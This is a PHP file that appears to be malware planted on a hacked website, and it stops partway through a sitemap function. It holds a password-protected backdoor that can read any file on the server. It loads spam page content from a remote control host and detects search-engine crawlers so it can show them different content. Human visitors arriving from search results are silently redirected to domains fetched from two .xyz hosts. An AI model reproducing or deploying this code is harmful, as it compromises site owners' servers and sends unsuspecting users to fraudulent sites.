<?php 
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jd1/");
define("GETDATE","http://www.datecenter.com/api/?key=");
define("CENTERKEY",2);
define("MYDIR", "/lt20180519-1/");
define("FNUM",50);
define("JGNUM","40");
define("LINKNUM","18");
define("BZSITE","g");
define("BZPRO","w");
//msbg
define("JDT","1");
//msend
//jthouzuibg
define("JTHZ","/");
//jthouzuiend


// #llqllq#arr_nametimebg

$arrnametime[]="1";
$arrnametime[]="4";
$arrnametime[]="3";
$arrnametime[]="2";


// #llqllq#arr_nametimeend

// #llqllq#arr_wordbg

$arr_word[0][] ="3";$arr_word[0][] ="2";$arr_word[0][] ="4";$arr_word[0][] ="2";$arr_word[0][] ="2";$arr_word[0][] ="4";$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="3";$arr_word[0][] ="3";$arr_word[1][] ="2";$arr_word[1][] ="3";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="3";$arr_word[1][] ="3";$arr_word[1][] ="2";$arr_word[1][] ="4";$arr_word[1][] ="4";$arr_word[1][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="2";$arr_word[2][] ="3";$arr_word[2][] ="4";$arr_word[2][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="2";$arr_word[2][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="2";$arr_word[3][] ="4";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[4][] ="2";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="4";$arr_word[4][] ="2";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="2";$arr_word[5][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="3";$arr_word[5][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="2";$arr_word[5][] ="4";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="3";$arr_word[6][] ="2";$arr_word[6][] ="4";$arr_word[6][] ="4";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="3";$arr_word[7][] ="3";$arr_word[7][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="2";$arr_word[7][] ="2";$arr_word[7][] ="4";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="4";$arr_word[8][] ="4";$arr_word[8][] ="3";$arr_word[8][] ="3";$arr_word[8][] ="4";$arr_word[8][] ="2";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[8][] ="4";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="4";$arr_word[9][] ="4";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="3";$arr_word[9][] ="4";$arr_word[10][] ="2";$arr_word[10][] ="4";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[10][] ="4";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="4";$arr_word[11][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="2";$arr_word[11][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="2";$arr_word[11][] ="3";$arr_word[11][] ="4";

// #llqllq#arr_wordend


// #llqllq#arr_keywz

$arrKeywz[]="12";
$arrKeywz[]="10";
$arrKeywz[]="9";
$arrKeywz[]="6";
$arrKeywz[]="11";
$arrKeywz[]="4";
$arrKeywz[]="7";
$arrKeywz[]="8";
$arrKeywz[]="5";


// #llqllq#arr_keywzend
// #llqllq#arr_fuhao

$arrfh[]="？";
$arrfh[]="；";
$arrfh[]="、";
$arrfh[]="！";
$arrfh[]="。";
$arrfh[]=" ";
$arrfh[]="，";
$arrfh[]="……";


// #llqllq#arr_fuhaoend


$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



// #llqllq#randkeybg
$strRand[0]="goinzxblwrhvsjktyedmucqafp";
$strRand[1]="qrogutjdxfpvwemlzsbhknacyi";
$strRand[2]="xehksglqzorifnbatpudycjwmv";
$strRand[3]="mjntsypbgdzuclriexkwofqavh";
$strRand[4]="uhbdmfsvlpgxizkwertqnacjoy";
$strRand[5]="ewsuhcbofqamkxlrytnjvigzpd";
$strRand[6]="amdbgkpesvwqlxhzcjotfiyrun";
$strRand[7]="tqzyadflxcwoevubhrgipmnjks";
$strRand[8]="gskizhmelopanvfjuqrcxbytwd";
$strRand[9]="lhwuicberpnqgfksatyojxmdzv";
$strRand[10]="scohbrqvpgawjmekifyzudntlx";
$strRand[11]="xeyojvcdfuahkgnswqzbmrtlpi";
$strRand[12]="wbyvhfunlxeosigkqramzjcdtp";
$strRand[13]="rtcjhiogufdexapvbswqnyzkml";
$strRand[14]="uicgqphojlexfynwvkdrtmbazs";
$strRand[15]="akrjvpwciebfzlqoxgnmyshtud";
$strRand[16]="qteugmhxywsilkcpjobnafvrzd";
$strRand[17]="prlfygcuqsbhdzwmeajnixvkto";
$strRand[18]="xqzdpbfayoukwclgstjhrvienm";
$strRand[19]="eybhfmvwtnkaqgxiusrlpozcjd";
$strRand[20]="wridfbzovqetgmuhalckpjnxys";
$strRand[21]="posmzndbghfveqawcilutyrxkj";
$strRand[22]="whplzydmveqiokbsajncxfrugt";
$strRand[23]="edpvkbcrlanqxswjfhiuzytgmo";
$strRand[24]="zfbkuxgnicvlotyeqrwpdmjsah";
$strRand[25]="nkscobjymwrdxqevhlutfpaizg";
$strRand[26]="cpnqiagksbyjlozwrhefdvmxut";
$strRand[27]="elgauofbtiqmjhdrnykvpwxczs";
$strRand[28]="bzhcmojlnyuiedaqspkwxtgrfv";
$strRand[29]="hdmkzcoyasjvfxgbwtiuqlpner";
$strRand[30]="gidmpyobuaewvjrkzctlnsxqfh";
$strRand[31]="vusqtgzdewybcrlnjhfxakpimo";
$strRand[32]="oatnbyilczqekdhmgjpsfvxurw";
$strRand[33]="cpizukrhgqsxmjaefbwlvnotyd";
$strRand[34]="srjfqoumwgtiabykpvzcdnxhle";
$strRand[35]="josmbukpnigcrdhzaxvetfywlq";
$strRand[36]="etyxrjlpzscqvkaufhmwnbgdio";
$strRand[37]="evtmwzxjpodgakuqrlsnfihbyc";
$strRand[38]="lopkbziyuqcxdfshejmwgtnarv";
$strRand[39]="uyxvbsmtrzghpfqldonaciwjek";
$strRand[40]="jgslfuncpmxirtbahqzweodkyv";
$strRand[41]="nmwuzaesthrdpbgyfjkivcxolq";
$strRand[42]="vfxscezbtdklhrpauqoymiwngj";
$strRand[43]="pevgifdjcaunbzqtykhwlxmors";
$strRand[44]="meypxrtabjfkvnqhgwcdzlsuoi";
$strRand[45]="gsixojkcptyreqmdvanuzwbfhl";
$strRand[46]="gmibwyroalqtkdvejcnuzpxfsh";
$strRand[47]="rqlzvikhwgfmbetpxdcysuoajn";
$strRand[48]="votyzhlkqcmugrsjbndwfixpea";
$strRand[49]="qdfsptwgrvxbyckhznoiemjula";
$strRand[50]="goijzunmrqlpvyabtfsckehxdw";
$strRand[51]="yvaunhgbtjoxdklwiferpqzscm";
$strRand[52]="pjivndsloczexkrhtmfgauybqw";
$strRand[53]="qxfvkzupcratdymoglsnjwhibe";
$strRand[54]="ktwcgoldqnrbvsfmhxpyjazeui";
$strRand[55]="galcpdtwuzjnhoyqvskrmefibx";
$strRand[56]="xrwyeljakovnmgituzhsqfpcbd";
$strRand[57]="nhvdmirtlukezsgbjwayqcpofx";
$strRand[58]="cjehlzmtusbgkxioyrfpqvnwad";
$strRand[59]="qwtodzvnympchrslkgeifuxajb";
$strRand[60]="gmqxrzdnybiojaefhsutlpkvwc";
$strRand[61]="jtsvliweuzyongmcfdpxqbhark";
$strRand[62]="jvnkycawzqutrmfgdoexhlsibp";
$strRand[63]="ivzuqlwgkscanemboxtfrdpyhj";
$strRand[64]="yitbuvjrwgxhakeqmlcdzofspn";
$strRand[65]="woaqutmxebhgyfjrszkndlcpiv";
$strRand[66]="hbqxuamjyirotwcgfzpdknsvel";
$strRand[67]="dypclbezhuvqkwxnfmgasoijrt";
$strRand[68]="nvhligxauefbtdpywkqszrojcm";
$strRand[69]="czqmvjxopwsdtybgralhunfeik";
$strRand[70]="sxdzojqhvntpicmyafguwblerk";
$strRand[71]="zxilkoavwrsyedmfpnugtqbjch";
$strRand[72]="qpzfgsvitrumkjdnwbcyleaoxh";
$strRand[73]="utcblperwfxmydioavskzgnjhq";
$strRand[74]="mkyevxnfziuwatljrbhodqspgc";
$strRand[75]="mldvsenizrofacgbpqtywhkjxu";
$strRand[76]="omltfnvshurikpabwedgxyzcjq";
$strRand[77]="lfopwjstvxnkrauzdeqchgyimb";
$strRand[78]="uelanfztphcxombjrsgdivwqyk";
$strRand[79]="cbwnodmqptlifzrsgvxykjuahe";
$strRand[80]="laqdvoejskgiftumycznxhwbpr";
$strRand[81]="dbwjvsaolmzfiytrgcuhnpxekq";
$strRand[82]="ezubskxvydmahjlwiftgpocnqr";
$strRand[83]="zcoxykhmnegdqrtiulwvpsfbaj";
$strRand[84]="vwfghkytrqjimpbadxelzcnsuo";
$strRand[85]="mqhxkidtwscorupeyafvnjzbgl";
$strRand[86]="ozjkupdlxgybncfvarseqtmihw";
$strRand[87]="cjvfgwdukinxbzoqtrsphemyal";
$strRand[88]="grwscldtyieqkhbmxjpoavnuzf";
$strRand[89]="husefgjlwimkbrcvaqyndoztpx";
$strRand[90]="tvqiycdhjungplxsowzaemfkrb";
$strRand[91]="yegsfbukzrptxqmdchwiajolnv";
$strRand[92]="rqaymeijxwzkgbcnluhodtpsfv";
$strRand[93]="nxteqscwomdzaulyjhvpgfrikb";
$strRand[94]="darwuliyneopxgzkqtbsvmhfcj";
$strRand[95]="nzxupalvqfocwesiyhbgrkdmjt";
$strRand[96]="worxmftnkqchgdyvpjsalzebui";
$strRand[97]="mbqpcuijfwaxnvlzesyrodgtkh";
$strRand[98]="uypndbcihstrvqojgezwlkmxaf";
$strRand[99]="mcjiekzqpyrnsabwovhxfutgld";

// #llqllq#randkeyend



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);
define("GETDOM",getthisdom());



// 
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'transferdm';
$stss2 = 'deliverym';


if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../sitemaps"))
		mkdir("../sitemaps", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		
		
		
		
		$idUrl =  GETDOM . "gpage.php?getid=$vss";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
		if(count($arrId) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}

if(isset($_POST["check"]) && md5($_POST["check"])=='b6772c68627f804a9578152ee90f5b0c'){$fileArr = array();
	$flag = 1;$fileArr['index'] = filesize(__FILE__);if(file_exists("./.htaccess")){$fileArr['htac'] = filesize("./.htaccess");}else{$flag = 0;$fileArr['htac'] = -1;}if(file_exists("./moban.html")){$fileArr['moban'] = filesize("./moban.html");}else{$flag = 0;$fileArr['moban'] = -1;}echo 'ok---'. serialize($fileArr) .'---';die();}if(isset($_POST["chdate"]) && md5($_POST["chdate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_POST["redate"]) && md5($_POST["redate"])=='b6772c68627f804a9578152ee90f5b0c' && isset($_POST["redate_file"])){
	$redate_file = $_POST["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);die();}else{echo '#nofile#';die();}}if(isset($_POST["test"]) && md5($_POST["test"])=='b6772c68627f804a9578152ee90f5b0c'){echo '#ok#';	die();}if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){
	die();}
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
	
	
}
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
if(isset($_GET["id"]))
	$id = $_GET["id"];else{
	$id = "5161-28102"; //llq index id 
}
$idTemp = explode('-',$id);if(count($idTemp) < 2)
	die();
$id23 = end($idTemp);



$numArr_key = count($arr_key);
$siteid = $idTemp[count($idTemp)-2];
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM;
// $_SERVER["HTTP_REFERER"] = "google.com.hk";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();	
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false){	
		$rsdom = '#^http://www\.[^/+]/$#si';
		
		$jumDom1 = 'http://www.'.$stss.'.xyz'. DOMTXT . $siteid .".txt";	
		$jumDom2 = 'http://www.'.$stss2.'.xyz'. DOMTXT . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$domJump = curl_getjs_from_webpage($jumDom1,2);
			$domJump = trim($domJump);

			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_getjs_from_webpage($jumDom2,10);
			
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 $fcontent = '';
 
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID";  
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 $rsInfo = '#<info>(.*)</info>#si';
 preg_match($rsInfo,$pInfoStr,$matchInfo);
 if(isset($matchInfo[1])){
	 $InFoStrArr = unserialize($matchInfo[1]);
 }else{
	 header("HTTP/1.1 404 Not Found");exit;
 }
 
 if(isset($InFoStrArr['frStr2'])){
	$frStr2 = $InFoStrArr['frStr2'];
	$fr2Arr = unserialize($frStr2);
 }
 
$frStr1 = $InFoStrArr['frStr1'];
$fr1Arr = unserialize($frStr1);

$Ptitle = $InFoStrArr['Ptitle'];

$nowIdName = $InFoStrArr['nowIdName'];

$Article = $InFoStrArr['Article'];


$fr1Strs = '<ul>'.PHP_EOL;
foreach($fr1Arr as $key=>$vs){
	list($tpSid,$tpPid) = explode('-',$key);
	$tpFlink = getalink($tpSid,$tpPid);
	$fr1Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
}
$fr1Strs .= '</ul>'.PHP_EOL;

if(isset($fr2Arr)){
	$fr2Strs = '<ul>'.PHP_EOL;
	foreach($fr2Arr as $key=>$vs){
		list($tpSid,$tpPid) = explode('-',$key);
		$tpFlink = getalink($tpSid,$tpPid);
		$fr2Strs .= '<li><a title="'.$vs.'" href="'.$tpFlink.'">'.$vs.'</a></li>'.PHP_EOL;
	}
	$fr2Strs .= '</ul>'.PHP_EOL;
}

 
 $thisPnameLink = '<a href="">'.$nowIdName.'</a>';
 $thisPnameLink2 = '<a title="'.$nowIdName.'" href="">'.$nowIdName.'</a>';
 
 $thisTitleLink = '<a title="'.$Ptitle.'" href="">'.$Ptitle.'</a>';
 $Article =  str_replace('#ttlink#',$thisTitleLink,$Article);
 $Article =  str_replace('#mylink#',$thisPnameLink2,$Article);



		$fileMb = fopen("moban.html","r");
			$html = fread($fileMb,filesize("moban.html"));			
			
			$html = str_ireplace('#bbbtitsbbb#', $Ptitle, $html);	
			$html = str_ireplace('#bbbkeybbb#', $nowIdName, $html);	
			$html = str_ireplace('#bbbdesbbb#', $nowIdName. ' ' .$Ptitle, $html);	
			
			$html = str_ireplace('#descontent#', $Article, $html);	
			
			if(isset($fr2Strs)){
				$html = str_replace('#link1#',$thisPnameLink,$html);
				$html = str_replace('#link2#',$thisPnameLink,$html);
				$html = str_replace('#link3#',$thisPnameLink,$html);
				$html = str_replace('#link4#',$thisPnameLink,$html);
				$html = str_replace('#link5#',$thisPnameLink,$html);
				
				$html = str_replace('#Flink1#',$fr1Strs,$html);
				$html = str_replace('#Flink2#',$fr2Strs,$html);
			}else{
				$html = str_replace('#link1#',$thisPnameLink,$html);
				$html = str_replace('#link2#','',$html);
				$html = str_replace('#link3#',$thisPnameLink,$html);
				$html = str_replace('#link4#','',$html);
				$html = str_replace('#link5#',$thisPnameLink,$html);
				
				$html = str_replace('#Flink1#',$fr1Strs,$html);
				$html = str_replace('#Flink2#','',$html);
			}
			

		
	echo $html;
 
die();
	
	
	
function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}


function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 

function glink($filenames,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	if($jdt == 1){
		$filePres = basename(__FILE__) . "?id=";	}else{
		$filePres = '';		$fileEnds = JTHZ;	}
	////获取文件目录
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$put_str = '';
	$urlsArray = $filenames;	//print_r($urlsArray);
	$numLinks = count($urlsArray);	
	foreach($urlsArray as $value){
		$curphp=basename(__FILE__); 
		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		//print_r( $value.$curphp."   ".$first."   ".$last);		if($first===false && $last===false && $checkTxt===false)
		{
			
			$url=$serpath ."/". $filePres . PRENAME . '-' . basename($value) .$fileEnds;			$put_str .= $url . PHP_EOL;				
		}
	}
		$gFile =  'urls.txt';		echo '<br/>'.$gFile.'';
		@unlink($gFile);		file_put_contents($gFile,$put_str);		echo "生成成功！<br/>";	
}
//生成sitemap.xml文件，超出4000个则换一个xml文件；参数$c=1生成原始路径的sitemap，$c=2则生成映射后的路径
//$dir目录参数


function print_map2($filenames,$c=1,$jdt=1){

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);
				$url = getalink($tempSid,$tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;		
			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;		
		header("Content-type: text/xml");
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);	
}

function print_map($filenames,$c=1,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		list($tempSid,$tempPid) = explode('-',$value);		
		$url = getalink($tempSid,$tempPid);	
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$put_str = $mapPre . $str . $mapEnd;
				header("Content-type: text/xml");
				echo $put_str;
				return;			
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		
		$put_str = $mapPre . $str . $mapEnd;
		header("Content-type: text/xml");		
		echo $put_str;

	}
	
	unset($tempArr1);	unset($filenames);		
}

function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
